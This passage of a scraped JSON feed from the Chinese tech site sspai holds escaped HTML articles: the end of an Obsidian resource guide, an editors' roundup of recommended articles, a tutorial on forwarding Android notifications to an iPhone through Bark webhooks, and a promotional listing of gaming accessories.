href=\"https://gitee.com/whghcyx/obsidian-plugin/blob/master/%E6%8F%92%E4%BB%B6.md\" target=\"_blank\">插件</a>和社区<a href=\"https://gitee.com/whghcyx/obsidian-plugin/blob/master/%E4%B8%BB%E9%A2%98.md\" target=\"_blank\">主题</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/22/28e95380bd37ee83424f8466cf01a57f.png\"><figcaption>插件列表</figcaption></figure><h2>其他视频资源</h2>\n<p><strong>注：</strong>此部分信息笔者本人并未观看，所以无法做出评价，也不失为一个学习 Obsidian 的信息来源。以下排名不分先后。</p>\n<ul>\n<li>\n<a href=\"https://space.bilibili.com/39954354\">胸毛齐腰</a> 的 Bilibili 视频</li>\n<li>\n<a href=\"https://www.bilibili.com/video/BV1P64y1q7ND\" target=\"_blank\">即凉</a>的 Bilibili 视频</li>\n<li>\n<a href=\"https://space.bilibili.com/241033241\">八角经刀</a> 的Bilibili 视频</li>\n</ul>\n<h2>后记</h2>\n<p>本次资源分享就到这里，整理到现在我也不禁感叹，Obsidian 的社区越来越繁荣了。</p>\n<p>谁能想得到呢？难得有这样一个完全免费的软件，文件放在用户本地，相当于将所有主动权都留给了用户。而 Obsidian 的社区插件，完全开放免费，插件开发者没有任何的酬劳，但是插件社区自开放以来，插件数量呈爆炸式增长；社区主题也是一样。</p>\n<p>以上我整理的资源的创作者，绝大多数都得以在爱好群结识。大家都是无偿的在做这件事。例如发收集众多信息，维护文档的 @落山鸡。这些，都是凭着一腔热血，凭着热爱在做。</p>\n<p>谁说世已无君子？在此，谨向所有的软件开发者、插件开发者、主题开发者、内容分享者致以深切的敬意。感谢你们！</p>\n<p><strong>注：</strong>本文的所有信息来源，均从 <a href=\"https://publish.obsidian.md/chinesehelp/07+%E4%BF%A1%E6%81%AF%E6%BA%90%E4%B8%8E%E8%B4%A1%E7%8C%AE%E8%80%85/obsidian%E7%9A%84%E4%BF%A1%E6%81%AF%E6%BA%90%EF%BC%88MOC%EF%BC%89\" target=\"_blank\">落山鸡的中文文档—信息源与贡献者</a> 获知，笔者仅补充一些说明和润色。篇幅和阅读范围所限，本文不可能列出所有中文信息源。读者可以访问上述中文文档查阅更多优质信息源，也欢迎向其投稿。</p>\n<hr>\n<p>题图来源：<a href=\"https://unsplash.com/photos/TdAfVvGXelo\" target=\"_blank\">Unsplash</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68427"},{"title":"不读可以先收藏 02 | 让这些好文章为你的稍后读加点料","date":"2021-08-25 06:30:00","description":"\n<h4><strong>不读可以先收藏</strong></h4>\n<p>让有价值的内容保持生命力，是对少数派作者分享和创作精神的肯定，对刚刚接触少数派的读者而言，这些内容也是方便他们直达少数派内容和 Matrix 社区核心价值的钥匙。</p>\n<p>在这个不定期更新的栏目中，少数派编辑部将人工挑选过去一段时间内值得重读和收藏的文章，这些内容凝聚了作者的耕耘和读者的肯定，应该能为想读好内容的你献上一份数字时代的「合订本」。</p>\n<hr>\n<p>大家好，今天是 2021 年 8 月 25 日。本栏目的第 2 期，我们从过去一个月时间里推荐到首页的 107 篇文章中挑选了 12 篇值得你收藏的好文。</p>\n<p>快把文章末尾的收藏按钮用起来吧。</p>\n<p>P.S. 感谢大家的支持，<a href=\"https://sspai.com/post/67830\" target=\"_blank\">第 1 期</a>「不读可以先收藏」的确成为了本次统计中充电、收藏数据最高的文章。考虑其栏目性质，本文不再另行推荐。</p>\n<h2>这些文章可以先收藏</h2>\n<h3>《你也可以配一副适合自己的眼镜：线上配镜的经验与实践》</h3>\n<p>🔋 充电量：313 | ⭐ 收藏量：667</p>\n<p>作者：<a href=\"https://sspai.com/u/zcz2be6v/posts\" target=\"_blank\">甜食</a></p>\n<blockquote>\n<p>在配新眼镜时，有几天的适应期是正常的，但由于人眼确实具备一定的可塑性，即使是配备得不那么准确的镜片，在一段时间之后也会被人眼适应，这就导致在长期的时间尺度上，「正常适应新镜片」和「妥协性适应不合适的镜片」经常会让人难以分清。而在适应之后，长期使用不合适的镜片不但不能起到足够的矫正和辅助作用，还会进一步伤害使用者的视力。</p>\n<p><a href=\"https://sspai.com/post/68035\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（张奕源 Nick）：</strong>作为这篇文章的责编，在和作者甜食沟通这个选题的时候，我们都没有料到它最终会成为一篇备受大家喜爱的「小爆款」。甜食作为常年的眼镜佩戴者，经历了一次完整的线下验光、线上配镜过程，并利用过程研究了当下国内的眼镜市场行情，将其撰文发出。没想到我派读者中的「眼镜一族」人数不少，文章乍一发出，大家就展开了了热烈的讨论和交流。</p>\n<p>本文的立意是「如何在确保验光准确、科学的前提下，花更少的钱配眼镜」，文章也就镜片和镜框的购买渠道、验光过程、镜片加工与装配等环节给出了切实、中肯的建议。对于日常佩戴眼镜的朋友们来说，这是一篇内容实用的好文章。当你下一次需要配镜时，文中提及的渠道和方法依然可以为你带来实际的帮助。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/2f82046a-f30a-79a8-7c08-faecb8e8d824.png\" alt=\"\"></figure><h3>《我们需要什么样的双向链接，它适合你吗？》</h3>\n<p>🔋 充电量：133 | ⭐ 收藏量：206</p>\n<p>作者：<a href=\"https://sspai.com/u/jena0930/posts\" target=\"_blank\">和燕燕</a></p>\n<blockquote>\n<p>作为一个知识工作者，我从含反向链接和块结构操作的笔记软件中受益良多，对工具的探索也让我对知识生产和知识管理本身有了更多认识。但是，工具终究还是辅助性的。一款适合的软件可以优化我们的工作流让我们更方便地记下我们的灵感、更好地专注于当下的思考、更便利地提供参考材料，但它代替不了思考和写作本身。</p>\n<p><a href=\"https://sspai.com/post/67996\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（PlatyHsu）：</strong>卡片盒笔记（zettelkasten）、双向链接（bi-directional link）、节点图谱（graph view）、扁平化结构（non-hierarchical structure）……面对这些「时髦」的笔记方法术语，你是否也曾困惑于它们的含义和相互关系，是否也曾怀疑过它们的实际价值？那么，这篇面对潮流而冷静思考的文章非常值得一读。文章从双向链接的概念、沿革和使用逻辑入手，以实例介绍了电子化工具是如何发挥双向链接的长处的，进而对双向链接相关的若干迷思发表了独到见解。归根结底，做笔记不是插花，没有必要教条地跟从特定的格式和工具，「勤于思考、勤于写作才是第一要义。」</p>\n<p>除了内容扎实，旁征博引也是本文的亮点所在；从段落中密密麻麻的下划线，便能看出作者的阅读之广、储备之深。如果这篇文章让你意犹未尽，不妨把文中的链接和文末的扩展阅读也点开看看，相信能帮助你更深入地了解卡片盒笔记、双向链接的来龙去脉，体悟知识管理的一般方法。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/e5e8123134cbedd9b003a4918c3e779a.jpeg\" alt=\"\"></figure><h3>《聊聊浏览器里的那把锁：HTTPS 如何让你安全冲浪？》</h3>\n<p>🔋 充电量：101 | ⭐ 收藏量：183</p>\n<p>作者：<a href=\"https://sspai.com/u/sanko/posts\" target=\"_blank\">SanKo</a></p>\n<blockquote>\n<p>公钥就像是从证书这个文件袋中捎过来的一个信封，一旦封口，就只有证书拥有者使用私钥才可以打开；换言之，你只要用这个信封寄送，那么就只有少数派可以读到（啊，用于封口的是一种神奇的胶水，这是由数学原理保证的）。</p>\n<p><a href=\"https://sspai.com/post/68040\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（广陵止息）</strong>：今天大部分网站都已经用上了 HTTPS 技术，但关注少数派的读者大多数都只知道 HTTPS 能保护信息安全，对其背后的工作原理却不甚了解；而网上大部分的 HTTPS 技术文档都从技术细节出发去讲解，而相信大部分没有技术背景的读者读完后这样的文章以后，可能依旧是一头雾水。这篇文章则从生动形象的例子入手，利用明信片这个有趣的媒介，通俗易懂地向读者介绍了什么是 HTTP、什么是 HTTPS 以及我们为什么需要 HTTPS，简单易读但又不失专业性。</p>\n<p>当然文章内容远不止科普 HTTPS，还简单介绍了几个你会经常看到的和网络安全有关的常见名词，希望可以在将来让你更易于理解类似的内容。在最后作者还给出了正确使用 HTTPS 的几点建议，希望可以帮助作为读者的你。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/c55847791397316430161d479c7979e8.jpg\" alt=\"\"></figure><h3>《2000 块钱，在广州租下并鼓捣一个可以装进梦想的家丨上》</h3>\n<p>🔋 充电量：226 | ⭐ 收藏量：195</p>\n<p>作者：<a href=\"https://sspai.com/u/gij6gkdt/posts\" target=\"_blank\">Elliana_W</a></p>\n<blockquote>\n<p>我是一个在深圳长大的孩子，但却更喜欢广州这座城市，它不仅有让人痴迷的烟火气，也有了让每一个人在这里安身立命的希望。从赤岗到东山口，再到白云山麓 —— 如今的我已经搬进了近 90 平米的高档小区，有了自己曾经梦想中的房间。</p>\n<p><a href=\"https://sspai.com/post/68122\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（Tp）</strong>：对于每个人来说，家永远是自己梦想的起航地和避风港。装修类的文章在少数派有不小的受众，但这篇文章中，<a href=\"https://sspai.com/u/gij6gkdt/updates\" target=\"_blank\">@Elliana_W</a> 并没有花笔墨去介绍装修「攻略」，反而从主观角度出发，分享了自己在搬家、装修前后的故事、想法，你不难从字里行间看出作者对于生活的热爱和思考。</p>\n<p>文章充满了细腻的语言和充满生活气息的描写，无论你是否有装修需求，这篇文章都会是值得一读的。你或许不能从这篇文章中学到「怎么装修」，但相信这篇文章可以给你带来「我们都有权利追求理想生活」的信心。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/article/c6483364-5157-6c4c-38a1-3ac8a195819f.jpeg\" alt=\"\"></figure><h3>《掌握这些健康自查手段，不再疑神疑鬼》</h3>\n<p>🔋 充电量：215 | ⭐ 收藏量：392</p>\n<p>作者：<a href=\"https://sspai.com/u/yn90jmjq/posts\" target=\"_blank\">刀客特Leslie</a></p>\n<blockquote>\n<p>文章中每个小节的内容拓展起来都可以单独写篇万字科普，受限于篇幅和个人水平，这篇稿子既不可能穷尽所有症状，也无法将单一的症状或体征讲得足够清晰，主要目的是提醒大家留意自己身体传达的健康/疾病信号，有异常尽早就诊，有问题及时治疗。</p>\n<p><a href=\"https://sspai.com/post/67800\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（北鸮）</strong>：Leslie 的每一篇文章都值得收藏和反复阅读。她的科普文章常常深入浅出，把复杂麻烦的医学知识讲得通透。从高血压到抑郁症，从心肺复苏到内涝自救，密集的知识点和通畅的阅读体验在她这里能稳定地共存。</p>\n<p>作为《年轻人的体检指南》系列的结尾，这一篇主要介绍了可以自行进行或是仅需简单辅助的查体方法，不管你是在家还是在宿舍，都可以对照文章给出的指引，做一些简单的健康自查。该系列的前两篇分别对体检的项目和如何有针对地做体检进行了充分的解释，在每次体检前后，你都应该翻出来读一读看一看，好对自己的身体了解得更多一点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/11cbb7e436d674e09448e25af18493a0.jpg\" alt=\"\"></figure><h2>值得关注的专栏内容</h2>\n<h3>你有权保持无聊</h3>\n<p>专栏： <a href=\"https://sspai.com/column/246\" target=\"_blank\">重新想象Lab</a></p>\n<blockquote>\n<p>或许在一个不那么紧凑的午后，在内心的绩效法则开了小差的瞬间，可任由空虚感袭来，化作心底不愿承认的对功成名就的质疑：谁在绑架我的时间、空间和整个人生，为何「功成名就」只有一种体现的方式？有着体面收入和显赫社会地位的律师也会在超市过磅结帐的瞬间羡慕起收银员简单重复而无聊的工作；人们结伴在冷气开放的商场中买一两个小时体验木工或油画来获得实在的创造力的满足（但成为一种刻奇，见《我和你有个共同点就是不想工作》）；幸福感排名（很难想像在意这个排名的人会幸福）永远名列前茅的丹麦人，普遍把远离现代生活的返璞归真小木屋作为理想，这又是为何？</p>\n<p><a href=\"https://sspai.com/post/68038\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：在「效率至上」时代，「无聊」无疑是一种罪过。从小我们就被教育「一寸光阴一寸金，寸金难买寸光阴」的道理，但是大人们没有解答的是：有了光阴，我们该做些什么？</p>\n<p>这看似是一个简单的问题，答案显而易见：做点正事。但什么又是「正事」呢？勤奋工作是正事，享受人生就不是吗？谁来定义一个人的「正事」呢？作者 Shooca 更是将这个问题推到了极限：我们是否有权不做所谓的「正事」，尝试保持无聊呢？</p>\n<p>如果你也曾在某个瞬间，问过自己这个问题，不妨读一读这篇文章。</p>\n<h3>小试牛刀，做几张公众号文章封面</h3>\n<p>专栏： <a href=\"https://sspai.com/column/244\" target=\"_blank\">Let's Figma</a></p>\n<blockquote>\n<p>生活在数字时代，每个人应该或多或少都需要给自己设计一些东西。比如说做公众号运营，需要设计文章封面；发布活动通知，需要做活动海报；找工作时需要给自己设计一份简历。</p>\n<p><a href=\"https://sspai.com/post/68038\" target=\"_blank\">阅读全文&gt;</a></p>\n</blockquote>\n<p><strong>编辑荐语（sainho）</strong>：Figma 在设计圈的热度自不必说，作者 leadream 很早就接触并使用 Figma 了，在 Figma 的使用和自动化交付有很深的研究。因此，我们特地邀请他来少数派开设「Let's Figma」专栏。</p>\n<p>在专栏中，leadream 会从 Figma 的使用技巧开始，例如这次推荐的文章，合理运用一些 Figma 的功能，就能让不懂设计的小伙伴，快速完成公众号封面，不必在朋友圈里找人帮忙。</p>\n<p>如果你对 Figma 的使用技巧也感兴趣，不妨订阅 <a href=\"https://sspai.com/column/244\" target=\"_blank\">Let's Figma</a> 专栏。</p>\n<h2>大家还爱看……</h2>\n<h3>《Obsidian 是什么以及它能用来做什么》</h3>\n<p>🔋 充电量：51 | ⭐ 收藏量：78</p>\n<p>作者：<a href=\"https://sspai.com/u/4b8zstxp/posts\" target=\"_blank\">LillianWho</a></p>\n<blockquote>\n<p>插件很容易让人着迷，尝试新插件、新工具都让人兴致勃勃、热血上涌。往往我们会高估一个工具的效果，就像我们对购物车中的商品怀有太高期待一样。其实，不如从基础款开始，因为简单，所以你的心里门槛会更低，更不容易对效果或对自己失望，也就越能发挥工具的价值。</p>\n<p><a href=\"https://sspai.com/post/67399\">阅读全文&gt;</a></p>\n</blockquote>\n<h3>《2020 年我阅读了 87 本书，推荐这 12 本好书给你》</h3>\n<p>🔋 充电量：102 | ⭐ 收藏量：136</p>\n<p>作者：<a href=\"https://sspai.com/u/qianguyihao/posts\" target=\"_blank\">千古壹号</a></p>\n<blockquote>\n<p>与其面对信息洪流，倒不如静下心来看一本书。<strong>只字不差地看一本好书，才是正经事</strong>。</p>\n<p><a href=\"https://sspai.com/post/67565\">阅读全文&gt;</a></p>\n</blockquote>\n<h3>《个人信息整理术：用 Notion 搭建我的「每日看板」》</h3>\n<p>🔋 充电量：58 | ⭐ 收藏量：97</p>\n<p>作者：<a href=\"https://sspai.com/u/kemin/posts\" target=\"_blank\">KM126</a></p>\n<blockquote>\n<p>在这个全平台自动同步的「看板」中，我可以随时查看我的一周计划、更新我的购物清单、新增或修改文章选题、整理数码产品用途、告诫自己少吃早睡，甚至追踪个人年度 OKR 的完成情况。</p>\n<p>对于我这样一个「事情不记下来就不能开始做」的强迫症来说，这张 Page 足以承载我绝大部分关于内容整理的需求。</p>\n<p><a href=\"https://sspai.com/post/67696\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/23/03f2e992e2f19b1a71efca10c5d98195.png\"></figure><h3>《6 年硕博生活的 6 条心得-生活成长篇》</h3>\n<p>🔋 充电量：80 | ⭐ 收藏量：76</p>\n<p>作者：<a href=\"https://sspai.com/u/kaopubear/posts\" target=\"_blank\">思考问题的熊</a></p>\n<blockquote>\n<p>很多人因为自己写的内容不会被别人看到而拒绝输出，但我想说输出其实是一种最高效的信任货币。人与人的交流本质上是利益交换，如果你觉得这句话太残忍，那就改成<strong>人与人的交流本质是信任交换</strong>。</p>\n<p>……<strong>绝大多数人都是消费者，只有很小一部分是生产者。</strong>这几年影响最大的一个改变就是学习把自己的视角从消费者转向生产者，先进行生产再进行消费。<strong>尽可能多的从任何层面去影响更多的人，先作为一个生产者去给予再作为一个消费者去索取。</strong>过去几年一个非常明显的感受，无论是科研还是其它，你的成就和价值（或者说挣多少钱）其实都和你能影响到多少人密切相关。</p>\n<p><a href=\"https://sspai.com/post/67442\">阅读全文&gt;</a></p>\n</blockquote>\n<h3>《从不懂 iOS 开发到 App Store 上架，开发过程和经验全分享》</h3>\n<p>🔋 充电量：54 | ⭐ 收藏量：86</p>\n<p>作者：<a href=\"https://sspai.com/u/francisfeng/posts\" target=\"_blank\">francisfeng</a></p>\n<blockquote>\n<p>我想很多有意 iOS 开发的人，心底或许希望有一天能走上独立开发的路，这条看起来很自然的路。但如果你期望于应用发布后立即大卖上榜，那你很可能失望。</p>\n<p>独立开发者一般只能做工具类应用，指望靠工具类应用养活一个团队是很难的，但养活一个人的可能性还是有的，特别是在中国这样不同城市生活成本差异巨大的国家。</p>\n<p><a href=\"https://sspai.com/post/67428\">阅读全文&gt;</a></p>\n</blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/23/9808262a664d7f7765bd9522619608ab.jpeg\"></figure><h3><strong>你也可以参与文章推荐活动</strong></h3>\n<p>以上便是本期「不读可以先收藏」要推荐给大家的全部内容。喜欢的文章居然没有上榜？这合理吗？</p>\n<p>⚡️️ 欢迎各位读者一起来评论区参与「文章推荐」活动，<strong>我们将挑选部分内容呈现在下期栏目中的「这些文章读者也爱看」部分并送出精美少数派商城周边一份</strong>。</p>\n<p>评论投稿内容可以参考本期栏目内容的格式：</p>\n<ul>\n<li>文章链接；</li>\n<li>推荐人（可空，默认为评论者的少数派昵称）；</li>\n<li>精选段落；</li>\n<li>推荐语。</li>\n</ul>\n<p>赶紧向大家推荐你心中的好文章吧。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68435"},{"title":"如何「优雅」地在 iPhone 上接收 Android 通知","date":"2021-08-25 03:25:39","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>优雅的实现自动化，是每个 Geeker 应有的能力。----我编的</p></blockquote>\n<p>工作需求，目前双持 iPhone 和 Android (工作用)设备。有需求将 Android 设备的某些通知转发到 iPhone上。</p>\n<p>短信里的验证码，微信群聊中的 @xxx，来电通知，我全都想要转发。一方面是想在玩 iPhone 的时候，不错过一些工作通知，另一方面想让 Android 的通知走 Apple Watch 推送，这样就能更及时的看到消息了。</p>\n<p>尝试过《小转发》等优秀的转发软件，但觉得设置过于复杂，不直观。偶然之间，发现了可以优雅实现转发的方法，下面请允许我娓娓道来~</p>\n<h2>前情提要</h2>\n<h3>设备</h3>\n<p>iPhone + Android 设备</p>\n<h3>应用服务</h3>\n<ol>\n<li>\n<strong>Bark</strong> =&gt; iOS端自定义接收通知的工具</li>\n<li>\n<strong>通知滤盒</strong> =&gt; 版本号 2.x.x ，付费应用，可能需要高级版</li>\n</ol>\n<span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/53090\"> </span><span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/59502\"> </span><span class=\"ss-linkCard\" link-card-href=\"https://sspai.com/post/60536\"> </span><h2>实现思路</h2>\n<blockquote>\n<p>通知滤盒根据自定义规则，拦截指定通知；</p>\n<p>将标题内容提取，再拼接到 Bark 的 URL 中，发送 Webhook 请求；</p>\n<p>即可优雅的实现自定消息转发。</p>\n</blockquote>\n<p><strong>以下，以转发微信中所有 「@我」的通知举例。</strong></p>\n<h3>打开新增 Webhook 规则页面</h3>\n<ol>\n<li>在「规则」页面中，找到「增强」区块。</li>\n<li>轻点「Webhook」卡片。</li>\n<li>轻点「+」按钮以新增规则。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/bee28f13158047a275c783d79ca9d25b.JPEG\"><figcaption>新增「增强」规则</figcaption></figure><h3>设置转发规则</h3>\n<ol>\n<li>命名规则 =&gt; Hi,有人找你（这个自行定义即可）</li>\n<li>选择 App =&gt; 选择「微信」</li>\n<li>选择内容 =&gt; 选择「包含任一文本」</li>\n<li>填写匹配规则 =&gt; 「@我」、「@所有人」</li>\n<li>根据需求选择时间段 =&gt; 此处我选择所有时间（如果在晚上转发，会被 iPhone 上的勿扰拦截掉）</li>\n<li>根据需求选择手机状态 =&gt; 我个人保持初始值</li>\n<li>填写 URL 值 =&gt; 请打开 Bark 获取请求 URL</li>\n<li>选择请求方式 =&gt; Bark 支持 POST 和 GET 方法</li>\n<li>保存规则</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/b58300cfcee50c22b9a4e43e844d1df3.JPG\"><figcaption>规则详情</figcaption></figure><h3>测试</h3>\n<ol>\n<li>拖动页面到底部，轻点「模拟测试」；</li>\n<li>展开区块中，轻点「测试」按钮；</li>\n<li>通知滤盒将会列举出符合条件的所有通知，和所预期的做对比；</li>\n<li>如果符合条件~ 恭喜你，已经优雅的设置好了转发；</li>\n<li>现在找个号，@自己一下试试。</li>\n<li>如果一切正常，现在您可以在 iPhone 上收到这条消息啦！</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/09/742bc8c9663a7fe0803af4ea636ab5cd.JPEG\"><figcaption>验收成果～</figcaption></figure><h2>扩展</h2>\n<h3>转发消息到另一个微信</h3>\n<ul>\n<li>通过「Server 酱」转发；</li>\n<li>通过「WxPusher」转发；</li>\n</ul>\n<h3>添加到 Flomo 笔记</h3>\n<ul><li>替换为 Flomo 的新增笔记 URL 即可；</li></ul>\n<h3>添加到 GTD 中</h3>\n<p>例如 Todoist，转发 URL 为 https://api.todoist.com/rest/v1/projects/xxxxx 即可，接口详情请参考 <a href=\"https://developer.todoist.com/sync/v8/#overview\" target=\"_blank\">此页面</a>。</p>\n<h3>转发信息到其他 Webhook</h3>\n<ul>\n<li>可以自己起一个后台服务，做更硬核的事情；</li>\n<li>也可以转发到 IFTTT ，联动更多设备。</li>\n</ul>\n<h2>尾巴</h2>\n<p>预祝各位 Geeker 们玩的愉快😉</p>\n<span class=\"ss-application\" app-id=\"16132\"> </span><span class=\"ss-application\" app-id=\"15141\"> </span><p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n","link":"https://sspai.com/post/68177"},{"title":"我们为你搜集了 9 款实用又有趣的游戏外设配件","date":"2021-08-25 03:03:54","description":"\n<p>包括本獭在内，我派有不少工友都是游戏爱好者，网站也经常有不少相关的内容。我们之前上架了诸如 <a href=\"https://item.taobao.com/item.htm?id=608898790039\" target=\"_blank\">Genki Switch 蓝牙适配器</a>、<a href=\"https://item.taobao.com/item.htm?id=648432364962\" target=\"_blank\">imPoi 手柄充电底座</a>、<a href=\"https://item.taobao.com/item.htm?id=650129707761\" target=\"_blank\">飞智银狐 T1 游戏蓝牙耳机</a> 等在内的游戏产品，除此之外，我们又为你搜罗了一批游戏相关的配件 / 周边，欢迎你按需选购。</p>\n<h2>⏰ <strong>活动详情</strong>\n</h2>\n<p>8.25 ~ 8.27，淘宝跨店每满 ￥200 减 ￥20</p>\n<h3>Genki Switch 蓝牙音频适配器</h3>\n<ul>\n<li>\n<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=608898790039\" target=\"_blank\">普通款：</a>￥238 <s>原价￥278</s>\n</li>\n<li>\n<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=642731988211\" target=\"_blank\">Lite 款：</a>¥218 <s>原价￥228</s>\n</li>\n</ul>\n<p>尽管 OLED 款的 Switch 已经宣布，但在 2021 年的今天，Switch 还依旧有无法支持蓝牙耳机的遗憾。来自 Genki 的蓝牙适配器就是为了解决这个问题而出现的。它的外包装模仿了 Switch 游戏卡带，非常的「任天堂」。支持同时连接两个蓝牙耳机，不管是 AirPods 还是常见的蓝牙音频设备都是可以的，对耳机型号没有特定要求。配对过一次后，后续使用只要插上这个小玩意，Switch 就会自动连上蓝牙耳机。另外插上之后，就算没连蓝牙耳机，Switch 也不会进行外放。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2020/09/21/bf8578c85aa0a433ccb0a5a486f2079c.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"\"></figure><p>而对于 Switch Lite 的玩家，Lite 款则是更适合的选择，四种颜色十分匹配机身，自带麦克风可以同时支持语音聊天，做得宛若老任官方出品，但需要注意的是，对比之前的普通款 Lite 款只能连接单个蓝牙设备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/5aaf1904a60a912f40b4e9346db56908.jpg\"></figure><h3>Genki Switch Lite 保护壳</h3>\n<p>¥138 <s>原价￥148</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650517649768\">点这买 &gt;</a></p>\n<p>而除了 Genki 蓝牙适配器，我们也上架了他家的 Switch Lite 保护壳，整体是磁吸的分体设计，素皮外壳+鹿皮绒布内里，盖子采用了可拆卸的设计，你可以根据需求决定形态。如果搭配上文提到的 Lite 蓝牙适配器，还会发现对于自家产品的完美适配：底部开的槽还正好能容纳 Lite 蓝牙适配器，怎么说，十分治愈强迫症了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/article/64a680cff803a299799f8b1ca420fbd9\"></figure><h3>八位堂 SN30 Pro 无线蓝牙游戏手柄</h3>\n<p>¥258 <s>原价￥268</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654039302848\" target=\"_blank\">点这买 &gt;</a></p>\n<p>八位堂 SN30 Pro 在采用了复古元素设计的同时，加入了诸多玩家喜闻乐见的现代支持。在支持的平台方面，包含了 Windows、macOS、Switch、Android 和 iOS。SN30 Pro 带有六轴体感，为诸多游戏适配了体感操作，无论是《喷射战士 2》还是《旷野之息》，都可以提升你的瞄准精度。作为一款无线手柄，内置了 480mAh 电池，官方标注续航为 16 小时，当然也是 Type-C 接口。</p>\n<p>它也拥有诸多智能化配置，搭配官方的软件还可以实现自定义按键连发、固件升级等实用功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/1f117411059b0e5ca228389b18d0f85f.jpg\"></figure><h3>imPoi Playstation / Xbox 手柄充电底座</h3>\n<ul>\n<li>\n<a href=\"https://item.taobao.com/item.htm?id=648431972566\" target=\"_blank\">PS 款：</a>¥89 <s>原价￥99</s>\n</li>\n<li>\n<a href=\"https://item.taobao.com/item.htm?id=648432364962\" target=\"_blank\">Xbox 款：</a>¥89 <s>原价￥99</s>\n</li>\n</ul>\n<p>对于游戏主机，只有单手柄的情况下经常充电还是不太爽，双手柄替换使用才能保证快乐不间断。如果觉得原厂太贵，不妨考虑下 imPoi 的 Xbox / PlayStation 的手柄充电底座。</p>\n<p>Playstation 款在第三方 DualSense 充电底座中，这款是在设计上最接近 PlayStation 5 设计语言的。白加黑的配色，橙和蓝的 LED 指示色，会让人以为这就是官方原装的。打完游戏，随手放在底座上，收纳摆放的同时对手柄进行充电，当 LED 灯从橙色变成蓝色时，你的手柄就已经充满电了。很难再碰到那种拿起手柄发现没电，还要拖着一根线一边充电一边玩的情况。除此之外还为 PlayStation 4 的 DualShock 手柄提供了套件，如果你的 PlayStation 4 还在服役，那么也能够轻松兼容。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/24/af820e702946279dcd232a6f13f0fb66.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>虽然是同样价格，Xbox 款相比 PS 款就显得「划算」一些，￥89 的价格不仅包含了充电底座，还会额外送两块 1200mAh 的电池，充电的时候会有指示灯显示状态，唯一的遗憾就是如果你的手柄是白色的，附送的盖子都是黑色，没法做到同色。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/67402\" target=\"_blank\">新玩意 068 - imPoi 手柄充电底座</a></p>\n<h3>飞智 银狐 T1 蓝牙耳机</h3>\n<p>¥289 送指套一对 <s>原价￥359</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=650129707761\" target=\"_blank\">点这买 &gt;</a></p>\n<p>@揽件阿平：最戳我痛点的是它的「轻」。耳机盒加上耳塞只有 48g，这个重量比我的 AirPods Pro 